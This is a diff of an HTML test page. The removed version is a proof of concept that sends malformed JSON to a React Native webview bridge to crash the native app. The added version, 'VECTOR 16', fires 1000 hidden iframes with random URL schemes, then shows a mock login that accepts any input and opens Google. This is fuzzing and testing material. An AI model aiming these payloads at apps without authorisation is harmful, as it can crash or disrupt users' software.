@@ -1,40 +1,698 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Bridge Crash PoC</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      background-color: #000;
-      color: #0f0;
-      font-family: monospace;
-      padding: 2em;
-    }
-    h1 {
-      color: #ff0;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VECTOR 16 - Secure Gateway</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:monospace;
+}
+
+body{
+    background:#050505;
+    color:#00ffaa;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+    transition: all 0.3s ease;
+}
+
+.container{
+    width:100%;
+    max-width:900px;
+    background:#111;
+    border:1px solid #ff3b30;
+    border-radius:18px;
+    padding:20px;
+    box-shadow:0 0 25px rgba(255,59,48,0.2);
+    transition: all 0.4s;
+}
+
+/* Login mode styles */
+.container.login-mode {
+    max-width: 450px;
+    background: #0a0a0a;
+    border: 1px solid #00ffaa;
+    box-shadow: 0 0 25px rgba(0,255,170,0.2);
+}
+
+.container.login-mode h1 {
+    color: #00ffaa;
+    text-shadow: 0 0 10px #00ffaa;
+}
+
+.container.login-mode .desc,
+.container.login-mode .instructions,
+.container.login-mode .stats,
+.container.login-mode .btn-group .google-btn {
+    display: none;
+}
+
+.container.login-mode .login-form {
+    display: block !important;
+}
+
+.container.login-mode .btn-group button:first-child {
+    background: #00aa55;
+}
+
+.login-form {
+    display: none;
+    margin: 20px 0;
+    animation: fadeIn 0.5s;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.login-card {
+    background: #050505;
+    border: 1px solid #00ffaa55;
+    border-radius: 16px;
+    padding: 25px 20px;
+    text-align: center;
+}
+
+.login-card h2 {
+    color: #00ffaa;
+    margin-bottom: 8px;
+    font-size: 24px;
+}
+
+.login-sub {
+    color: #888;
+    font-size: 12px;
+    margin-bottom: 25px;
+}
+
+.input-group {
+    margin-bottom: 18px;
+    text-align: left;
+}
+
+.input-group label {
+    display: block;
+    font-size: 12px;
+    margin-bottom: 6px;
+    color: #00ffaa;
+    letter-spacing: 1px;
+}
+
+.input-group input {
+    width: 100%;
+    background: #1a1a1a;
+    border: 1px solid #ff3b3088;
+    border-radius: 10px;
+    padding: 12px 14px;
+    color: #00ffaa;
+    font-size: 14px;
+    outline: none;
+    transition: 0.2s;
+}
+
+.input-group input:focus {
+    border-color: #00ffaa;
+    box-shadow: 0 0 8px #00ffaa55;
+}
+
+.login-btn {
+    width: 100%;
+    background: #ff3b30;
+    color: white;
+    padding: 12px;
+    border: none;
+    border-radius: 12px;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 10px;
+    transition: 0.2s;
+}
+
+.login-btn:hover {
+    background: #00ffaa;
+    color: black;
+    box-shadow: 0 0 12px #00ffaa;
+}
+
+.demo-cred {
+    margin-top: 20px;
+    font-size: 11px;
+    color: #ffcc00;
+    background: #1a1a1a;
+    padding: 8px;
+    border-radius: 8px;
+}
+
+.demo-cred span {
+    color: #aaa;
+}
+
+.glow-text {
+    color: #ffcc00;
+}
+
+h1{
+    text-align:center;
+    color:#ff3b30;
+    margin-bottom:10px;
+    text-shadow:0 0 10px #ff3b30;
+    transition: 0.3s;
+}
+
+.desc{
+    text-align:center;
+    color:#aaa;
+    margin-bottom:20px;
+    font-size:13px;
+    line-height:1.6;
+}
+
+.instructions{
+    background:#1a1a1a;
+    border:1px solid #00ffaa44;
+    padding:12px;
+    border-radius:10px;
+    margin-bottom:20px;
+    font-size:12px;
+    line-height:1.7;
+}
+
+.instructions b{
+    color:#ffcc00;
+}
+
+.stats{
+    display:flex;
+    gap:10px;
+    margin-bottom:20px;
+    flex-wrap:wrap;
+}
+
+.card{
+    flex:1;
+    min-width:120px;
+    background:#0a0a0a;
+    border:1px solid #00ffaa33;
+    border-radius:10px;
+    padding:10px;
+    text-align:center;
+}
+
+.card h2{
+    color:#ffcc00;
+    font-size:18px;
+}
+
+.card span{
+    font-size:11px;
+    color:#aaa;
+}
+
+.btn-group{
+    display:flex;
+    gap:10px;
+    flex-wrap:wrap;
+    margin-bottom:20px;
+}
+
+button{
+    flex:1;
+    min-width:200px;
+    padding:14px;
+    border:none;
+    border-radius:12px;
+    background:#ff3b30;
+    color:white;
+    font-weight:bold;
+    cursor:pointer;
+    transition:.2s;
+}
+
+button:hover{
+    background:#00ffaa;
+    color:black;
+    transform: scale(0.98);
+}
+
+.google-btn{
+    background:#0066ff;
+}
+
+.log{
+    height:300px;
+    overflow:auto;
+    background:black;
+    border:1px solid #00ffaa;
+    border-radius:10px;
+    padding:10px;
+    font-size:12px;
+    transition: 0.3s;
+}
+
+.container.login-mode .log {
+    display: none;
+}
+
+.entry{
+    margin-bottom:6px;
+    border-left:3px solid #ff3b30;
+    padding-left:8px;
+}
+
+.success{
+    color:#00ffaa;
+    border-left-color:#00ffaa;
+}
+
+.warning {
+    color: #ffaa33;
+    border-left-color: #ffaa33;
+}
+
+.status-badge {
+    display: inline-block;
+    background: #ff3b3022;
+    padding: 2px 8px;
+    border-radius: 12px;
+    font-size: 10px;
+    margin-left: 6px;
+}
+</style>
 </head>
 <body>
-  <h1>Native Crash Trigger</h1>
-  <p>If you're seeing this, the payload has been sent to the app's native bridge.</p>
-  <pre id="log">Sending malformed payload to native bridge...</pre>
-  <script>
-    const log = msg => document.getElementById("log").textContent += "\n" + msg;
-    try {
-      if (window.webkit?.messageHandlers?.ReactNativeWebView) {
-        log("ReactNativeWebView handler detected.");
-        // Malformed JSON payload – expected to crash native app if not handled
-        const payload = "{unclosed_json:";
-        window.webkit.messageHandlers.ReactNativeWebView.postMessage(payload);
-        log("Payload sent: " + payload);
-      } else {
-        log("ReactNativeWebView handler not available.");
-      }
-    } catch (e) {
-      log(" JS Exception: " + e.message);
+
+<div class="container" id="mainContainer">
+
+    <h1 id="mainTitle">⚡ VECTOR 16 ⚡</h1>
+
+    <div class="desc">
+        Random Protocol Fuzzer → Secure Authentication Gateway
+    </div>
+
+    <div class="instructions" id="instructionsPanel">
+        <b>INSTRUKSI:</b><br><br>
+        1. Klik tombol <b style="color:#ff3b30">RUN VECTOR 16</b><br>
+        2. Sistem akan melakukan fuzzing protocol<br>
+        3. Setelah selesai, halaman akan <b>BERUBAH menjadi LOGIN PAGE</b><br>
+        4. Masukkan kredensial (atau gunakan demo)<br>
+        5. Setelah login sukses, Google akan terbuka di tab baru
+    </div>
+
+    <div class="stats" id="statsPanel">
+        <div class="card">
+            <h2 id="count">0</h2>
+            <span>Protocols Generated</span>
+        </div>
+
+        <div class="card">
+            <h2 id="active">READY</h2>
+            <span>Status</span>
+        </div>
+    </div>
+
+    <div class="btn-group">
+        <button id="runButton" onclick="vectorProtocolFuzzer()">
+            RUN VECTOR 16
+        </button>
+
+        <button class="google-btn" id="googleBtn" onclick="openGoogleDirect()">
+            BUKA GOOGLE.COM NEW TAB
+        </button>
+    </div>
+
+    <div class="log" id="log"></div>
+
+    <!-- LOGIN FORM (hidden initially) -->
+    <div class="login-form" id="loginForm">
+        <div class="login-card">
+            <h2>🔐 SECURE GATEWAY</h2>
+            <div class="login-sub">Authenticate to continue</div>
+            
+            <div class="input-group">
+                <label>⚡ USERNAME / ACCESS ID</label>
+                <input type="text" id="username" placeholder="vector_user" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <label>🔑 PROTOCOL KEY</label>
+                <input type="password" id="password" placeholder="••••••••">
+            </div>
+            
+            <button class="login-btn" onclick="handleLogin()">
+                ▶ AUTHENTICATE & UNLOCK GOOGLE
+            </button>
+            
+            <div class="demo-cred">
+                💡 <span>DEMO CREDENTIAL</span><br>
+                user: <strong class="glow-text">admin</strong> &nbsp;|&nbsp; pass: <strong class="glow-text">vector16</strong><br>
+                (atau isi bebas untuk demo)
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let generated = 0;
+let isLoginModeActive = false;
+let fuzzerCompleted = false;
+let timeoutIds = [];
+
+function addLog(msg, type = "") {
+    const logDiv = document.getElementById("log");
+    if (!logDiv) return;
+    
+    const div = document.createElement("div");
+    div.className = "entry " + type;
+    div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logDiv.appendChild(div);
+    logDiv.scrollTop = logDiv.scrollHeight;
+}
+
+function randomString(len) {
+    return Math.random().toString(36).substring(2, 2 + len);
+}
+
+function randomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+// Clear previous iframes
+function clearTempIframes() {
+    const iframes = document.querySelectorAll('iframe.temp-fuzzer');
+    iframes.forEach(iframe => iframe.remove());
+}
+
+async function vectorProtocolFuzzer() {
+    // Prevent multiple runs if already in login mode or fuzzer running
+    if (isLoginModeActive) {
+        addLog("System already in LOGIN MODE. Please complete authentication.", "warning");
+        return;
     }
-  </script>
+    
+    if (fuzzerCompleted) {
+        addLog("Fuzzer already executed. Page is in login mode. Use login form to open Google.", "warning");
+        return;
+    }
+    
+    addLog("════════════════════════════════════════", "success");
+    addLog("VECTOR 16 protocol fuzzer INITIATED", "success");
+    document.getElementById("active").innerText = "RUNNING";
+    document.getElementById("runButton").disabled = true;
+    document.getElementById("runButton").style.opacity = "0.6";
+    
+    let chars = 'abcdefghijklmnopqrstuvwxyz0123456789+-.';
+    let protocolsGenerated = [];
+    
+    // Simulation with performance optimization
+    for (let i = 0; i < 1000; i++) {
+        let protocol = '';
+        let protoLen = randomInt(3, 15);
+        for (let j = 0; j < protoLen; j++) {
+            protocol += chars[Math.floor(Math.random() * chars.length)];
+        }
+        protocolsGenerated.push(protocol);
+        
+        // Create minimal iframe with cleanup
+        let iframe = document.createElement('iframe');
+        iframe.className = 'temp-fuzzer';
+        iframe.src = `${protocol}://${randomString(8)}.fuzz/`;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        generated++;
+        
+        // Schedule removal
+        const timeoutId = setTimeout(() => {
+            if (iframe && iframe.remove) iframe.remove();
+        }, 5);
+        timeoutIds.push(timeoutId);
+        
+        // Log periodically
+        if (i % 80 === 0 && i > 0) {
+            addLog(`⚙️ Fuzzing progress: ${i}/1000 protocols (${protocol}://...)`, "");
+        }
+    }
+    
+    // Clean up any remaining iframes after delay
+    setTimeout(() => {
+        clearTempIframes();
+        timeoutIds.forEach(id => clearTimeout(id));
+        timeoutIds = [];
+    }, 200);
+    
+    document.getElementById("count").innerText = generated;
+    addLog(`✅ 1000 random protocol injections COMPLETE | Total: ${generated} entries`, "success");
+    addLog("🔄 TRANSITIONING TO SECURE LOGIN GATEWAY...", "success");
+    document.getElementById("active").innerText = "TRANSITION";
+    
+    // Mark fuzzer completed
+    fuzzerCompleted = true;
+    
+    // Small delay before transforming UI to login page
+    setTimeout(() => {
+        transformToLoginMode();
+    }, 800);
+}
+
+function transformToLoginMode() {
+    isLoginModeActive = true;
+    
+    const container = document.getElementById("mainContainer");
+    const mainTitle = document.getElementById("mainTitle");
+    const instructionsPanel = document.getElementById("instructionsPanel");
+    const statsPanel = document.getElementById("statsPanel");
+    const logDiv = document.getElementById("log");
+    const loginFormDiv = document.getElementById("loginForm");
+    const runButton = document.getElementById("runButton");
+    const googleBtn = document.getElementById("googleBtn");
+    const activeStatus = document.getElementById("active");
+    
+    // Add login-mode class for global styling
+    container.classList.add("login-mode");
+    
+    // Update title with stylish effect
+    mainTitle.innerHTML = "🔐 VECTOR 16 • AUTHENTICATION";
+    mainTitle.style.color = "#00ffaa";
+    mainTitle.style.textShadow = "0 0 12px #00ffaa";
+    
+    // Hide original panels
+    if (instructionsPanel) instructionsPanel.style.display = "none";
+    if (statsPanel) statsPanel.style.display = "none";
+    if (logDiv) logDiv.style.display = "none";
+    
+    // Show login form with fade
+    if (loginFormDiv) loginFormDiv.style.display = "block";
+    
+    // Modify run button text + behavior
+    if (runButton) {
+        runButton.innerText = "⟳ SYSTEM LOCKED";
+        runButton.disabled = true;
+        runButton.style.background = "#555";
+        runButton.style.cursor = "not-allowed";
+        runButton.style.opacity = "0.5";
+    }
+    
+    // Keep google button but update state / visual
+    if (googleBtn) {
+        googleBtn.innerText = "🌐 BUKA GOOGLE (via LOGIN)";
+        googleBtn.style.background = "#3399ff";
+        googleBtn.disabled = false;
+    }
+    
+    if (activeStatus) activeStatus.innerText = "AUTH REQUIRED";
+    
+    addLogToNewInterface("🔐 LOGIN GATEWAY ACTIVATED | Please authenticate to open Google");
+}
+
+// Special log function after login mode (since original log is hidden, we can show status in container or console)
+function addLogToNewInterface(msg) {
+    console.log(`[LOGIN MODE] ${msg}`);
+    // Optional: show toast / temp notification on top of login screen
+    const loginCard = document.querySelector(".login-card");
+    if (loginCard && !document.querySelector(".login-toast")) {
+        // Create temporary message element
+        let toast = document.createElement("div");
+        toast.className = "login-toast";
+        toast.style.background = "#00ffaa22";
+        toast.style.border = "1px solid #00ffaa";
+        toast.style.borderRadius = "8px";
+        toast.style.padding = "8px";
+        toast.style.marginBottom = "15px";
+        toast.style.fontSize = "11px";
+        toast.style.textAlign = "center";
+        toast.style.color = "#00ffaa";
+        toast.innerText = msg;
+        loginCard.insertBefore(toast, loginCard.firstChild);
+        setTimeout(() => toast.remove(), 3000);
+    }
+}
+
+function handleLogin() {
+    if (!isLoginModeActive) {
+        alert("Please run VECTOR 16 fuzzer first to unlock login gateway.");
+        return;
+    }
+    
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+    
+    // Demo credentials: admin/vector16 OR any non-empty fields for convenience
+    let isValid = false;
+    if ((username === "admin" && password === "vector16") || (username !== "" && password !== "")) {
+        isValid = true;
+    } else if (username === "" && password === "") {
+        isValid = false;
+    } else {
+        // For demo, we allow any non-empty user/pass to showcase functionality
+        if (username.length > 0 && password.length > 0) {
+            isValid = true;
+        }
+    }
+    
+    if (!isValid) {
+        // Show error on login card
+        const loginCard = document.querySelector(".login-card");
+        let errorDiv = document.getElementById("loginErrorMsg");
+        if (!errorDiv) {
+            errorDiv = document.createElement("div");
+            errorDiv.id = "loginErrorMsg";
+            errorDiv.style.background = "#ff3b3022";
+            errorDiv.style.border = "1px solid #ff3b30";
+            errorDiv.style.borderRadius = "8px";
+            errorDiv.style.padding = "10px";
+            errorDiv.style.marginBottom = "15px";
+            errorDiv.style.fontSize = "12px";
+            errorDiv.style.color = "#ff8866";
+            errorDiv.style.textAlign = "center";
+            loginCard.insertBefore(errorDiv, loginCard.firstChild);
+        }
+        errorDiv.innerText = "❌ AUTHENTICATION FAILED | Gunakan 'admin' / 'vector16' atau isi kedua field";
+        setTimeout(() => {
+            if (errorDiv) errorDiv.style.opacity = "0";
+            setTimeout(() => {
+                if (errorDiv && errorDiv.remove) errorDiv.remove();
+            }, 800);
+        }, 2000);
+        return;
+    }
+    
+    // Remove any error
+    const oldError = document.getElementById("loginErrorMsg");
+    if (oldError) oldError.remove();
+    
+    // Show success indicator
+    const loginBtn = document.querySelector(".login-btn");
+    const originalText = loginBtn.innerText;
+    loginBtn.innerText = "✓ AUTHENTICATED • OPENING GOOGLE...";
+    loginBtn.style.background = "#00aa55";
+    loginBtn.disabled = true;
+    
+    addLogToNewInterface(`✅ Welcome ${username || 'user'}! Access granted. Opening Google in new tab...`);
+    
+    // Visual success animation
+    const loginCardDiv = document.querySelector(".login-card");
+    loginCardDiv.style.border = "2px solid #00ffaa";
+    loginCardDiv.style.boxShadow = "0 0 20px #00ffaa";
+    
+    // Delay to show success feedback
+    setTimeout(() => {
+        // Open Google in NEW TAB as per instruction
+        const googleWindow = window.open("https://www.google.com", "_blank");
+        if (!googleWindow || googleWindow.closed || typeof googleWindow.closed == 'undefined') {
+            // Fallback if popup blocked
+            alert("Pop-up mungkin diblokir browser. Klik OK untuk membuka Google secara manual.");
+            window.location.href = "https://www.google.com";
+        }
+        
+        // Additional log
+        console.log("Google.com opened in new tab after login");
+        
+        // Change button state after opening
+        loginBtn.innerText = "✔ GOOGLE OPENED";
+        setTimeout(() => {
+            // Optional: reset text but keep success vibe
+            loginBtn.innerText = "✓ ACCESS GRANTED";
+        }, 2000);
+        
+        // Also show final status on the active field if accessible
+        const activeSpan = document.getElementById("active");
+        if (activeSpan) activeSpan.innerText = "GOOGLE OPENED";
+        
+        // Final log message inside original log if visible? But hidden, so add subtle note
+        const containerDiv = document.getElementById("mainContainer");
+        const successNote = document.createElement("div");
+        successNote.style.textAlign = "center";
+        successNote.style.marginTop = "15px";
+        successNote.style.fontSize = "11px";
+        successNote.style.color = "#00ffaa";
+        successNote.style.background = "#1a2a1a";
+        successNote.style.padding = "6px";
+        successNote.style.borderRadius = "20px";
+        successNote.innerText = "✨ Google tab launched successfully ✨";
+        if (!document.querySelector(".final-success-note")) {
+            successNote.className = "final-success-note";
+            containerDiv.appendChild(successNote);
+            setTimeout(() => successNote.remove(), 4000);
+        }
+        
+    }, 600);
+}
+
+// Direct google button (if user clicks before login mode, they need fuzzer)
+function openGoogleDirect() {
+    if (!fuzzerCompleted && !isLoginModeActive) {
+        addLog("⚠️ ACCESS DENIED: Harap jalankan RUN VECTOR 16 terlebih dahulu untuk mengaktifkan sistem.", "warning");
+        alert("Akses ditolak! Silakan klik 'RUN VECTOR 16' terlebih dahulu. Setelah selesai, login akan muncul.");
+        return;
+    }
+    
+    if (isLoginModeActive && fuzzerCompleted) {
+        addLogToNewInterface("🔒 Silakan login melalui formulir untuk membuka Google (proteksi keamanan).");
+        alert("🔐 Silakan login terlebih dahulu menggunakan formulir yang muncul untuk membuka Google.com");
+        return;
+    }
+    
+    if (fuzzerCompleted && !isLoginModeActive) {
+        // edge case
+        addLog("Sistem dalam transisi. Tunggu sebentar hingga login form muncul.");
+        alert("Tunggu login form muncul, lalu login untuk membuka Google.");
+        return;
+    }
+    
+    // Fallback if somehow no condition
+    addLog("Tombol Google hanya berfungsi setelah login sukses melalui formulir.", "warning");
+}
+
+// Override to make sure fuzzer cleans up any intervals
+window.addEventListener('load', () => {
+    addLog("VECTOR 16 SECURE GATEWAY READY", "success");
+    addLog("Klik RUN VECTOR 16 untuk memulai fuzzing & mengaktifkan login page", "");
+    
+    // Prefill demo credentials hint
+    const usernameField = document.getElementById("username");
+    const passField = document.getElementById("password");
+    if (usernameField && passField) {
+        usernameField.value = "";
+        passField.value = "";
+        // Optional placeholder demo hint
+        usernameField.placeholder = "admin atau user bebas";
+        passField.placeholder = "vector16 atau password bebas";
+    }
+});
+
+// Cleanup on page unload
+window.addEventListener('beforeunload', () => {
+    clearTempIframes();
+    timeoutIds.forEach(id => clearTimeout(id));
+});
+</script>
 </body>
 </html>
